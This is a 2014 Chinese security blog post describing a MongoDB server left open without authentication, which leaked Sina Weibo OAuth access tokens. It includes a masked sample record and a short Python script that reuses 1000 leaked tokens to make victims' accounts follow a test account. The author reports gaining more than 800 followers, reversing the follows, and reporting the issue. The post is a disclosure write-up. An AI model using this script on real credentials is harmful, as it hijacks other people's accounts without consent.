<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>Mongodb未授权访问漏洞之某主机泄露新浪微博accessToken - Linux.im</title>
    <meta name="description" content="Hacking for fun. - evi1m0"/>
    <link rel="stylesheet" href="/css/linux-im.css" type="text/css" />
    <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
  </head>
  <body>
    <style>
      h1 {
        font-family: STFangSong, Helvetica, Arial, Vernada, Tahoma, STXihei, "Microsoft YaHei", "Songti SC", SimSun, Heiti, sans-serif;
      }
    </style>
    <div class="site">
      <div class="post-content" style="margin-top: -20px;">
        <div id="post">
          <h2 id="mongodbaccesstoken">Mongodb未授权访问漏洞之某主机泄露新浪微博accessToken</h2>

<p class="date">18 Dec 2014 - Evi1m0</p>

<h4 id="section">背景</h4>

<p>在前段时间邪红F1,2,4发出 <a href="http://www.hackersoul.com/post/mongodb_unauthorized_access_vulnerability_global_probing_report.html">《Mongodb unauthorized access vulnerability global probing report》</a> 后，我们对这些受影响的列表进行了简单的数据分析，其中发现了一台有趣的主机。</p>

<h4 id="section-1">数据泄露</h4>

<p>其中这台Mongodb数据主机存储着大量的微信公众号信息，新浪微博授权信息等敏感信息，其中我们对新浪微博授权信息进行简单的测试。</p>

<h4 id="section-2">测试过程</h4>

<p>筛选1000条存储的用户新浪微博的授权数据，其中格式为：</p>

<pre><code>{
    "_modified" : ISODate("2014-09-14T06:30:33.718Z"),
    "_created" : ISODate("2014-09-14T06:30:33.718Z"),
    "uid" : "163****265",
    "url" : "u/163****265",
    "name" : "猫****",
    "screenName" : "猫****",
    "accessToken" : "2.00LniemB******d10ba02ef5oEMJTB",
    "description" : "",
    "verified" : false,
    "logo" : "http://tp2.sinaimg.cn/1635102265/50/4000*****04/1",
    "logoLarge" : "http://tp2.sinaimg.cn/1635102265/180/4000*****04/1",
    "type" : "normal",
    "_id" : "14872d****48a87"
}
</code></pre>

<p>其中数据泄露新浪微博用户授权成功后的accessToken值，将数据以JSON进行导出后使用Python进行处理，提取出1000条accessToken方便进行测试。</p>

<p><a href="http://open.weibo.com/wiki/%E5%BE%AE%E5%8D%9AAPI">微博API</a>：</p>

<ul>
  <li><a href="http://open.weibo.com/wiki/2/statuses/update">statuses/update 发布一条微博信息</a></li>
  <li><a href="http://open.weibo.com/wiki/2/statuses/user_timeline/ids">statuses/user_timeline/ids 获取用户发布的微博的ID</a></li>
  <li><a href="http://open.weibo.com/wiki/2/statuses/destroy">statuses/destroy 根据微博ID删除指定微博</a></li>
  <li><a href="http://open.weibo.com/wiki/2/friendships/create">friendships/create 关注一个用户</a></li>
  <li><a href="http://open.weibo.com/wiki/%E5%BE%AE%E5%8D%9AAPI">More</a></li>
</ul>

<p>之后我们使用关注用户API进行简单的测试，编写脚本批量的利用泄露的accessToken值进行关注用户：</p>

<pre><code>#!/usr/bin/env python
# coding=utf8
# author=evi1m0#ff0000team

import requests

f = open('./accessToken.txt','r')
flag = 1
for i in f:
    api_url = 'https://api.weibo.com/2/friendships/create.json'
    post = {"uid":"5238604657", "access_token":i.split()}
    requests.post(api_url, data=post)
    flag+=1
    print '[*] ' + str(flag) + ': ' + api_url
    print post
    print
</code></pre>

<p>其中uid为关注用户的UID，遍历./accessToken.txt中的accessToken进行请求，于是不一会儿的功夫我们测试微博收到了新增800多个粉丝的消息，后面我们又利用取消关注API进行了取消操作。</p>

<h4 id="section-3">状态</h4>

<p>我们没有对这些数据进行恶意利用，目前已提交给官方进行及时修复：）</p>

        </div>
      </div>

      <div id="disqus_thread"></div>
      <script type="text/javascript">
        var disqus_shortname = 'evi1m0';
        (function() {
          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>
      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

      <!-- footer -->
      <div class="footer">
        <div class="contact">
          <p>
            <a href="/" style="text-decoration: none; margin-right: 5px;">Index</a> |&nbsp;
            <a href="/feed.xml" target="_blank" style="text-decoration: none; margin-right: 5px;">RSS</a> |&nbsp;
            <a href="http://weibo.com/Evi1m0" target="_blank" style="text-decoration: none; margin-right: 5px;">Weibo</a> |&nbsp;
            <a href="mailto:evi1m0.bat@gmail.com">evi1m0.bat@gmail.com</a>
          </p>
        </div>
      </div>
    </div>

    <div style="display: none;">
      <script src="http://s4.cnzz.com/z_stat.php?id=1254574847&web_id=1254574847" language="JavaScript"></script>
    </div>
  </body>
</html>
